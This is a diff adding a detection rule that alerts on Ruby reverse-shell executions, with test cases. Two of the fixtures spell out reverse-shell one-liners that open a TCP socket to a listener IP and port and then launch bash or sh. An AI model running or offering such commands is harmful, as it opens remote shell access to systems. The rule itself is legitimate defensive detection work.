@@ -1,0 +1,21 @@
+name: sigma_ruby_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_executable.contains("ruby") && (e.process_args.contains(" -e") && e.process_args.contains("rsocket") && e.process_args.contains("TCPSocket")) && (e.process_args.contains(" ash") || e.process_args.contains(" bash") || e.process_args.contains(" bsh") || e.process_args.contains(" csh") || e.process_args.contains(" ksh") || e.process_args.contains(" pdksh") || e.process_args.contains(" sh") || e.process_args.contains(" tcsh"))
+  )
+tests:
+  - cleartext: "ruby with -rsocket TCPSocket and bash"
+    process_name: ruby
+    process_executable: /usr/bin/ruby
+    process_args: "ruby -rsocket -e 'c=TCPSocket.new(\"10.10.10.10\",\"4444\"); bash'"
+    should_match: true
+  - cleartext: "ruby with rsocket TCPSocket and sh"
+    process_name: ruby
+    process_executable: /usr/bin/ruby
+    process_args: "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"1234\");spawn( sh)'"
+    should_match: true
+  - cleartext: "normal ruby"
+    process_name: ruby
+    process_args: "ruby script.rb"
+    should_match: false
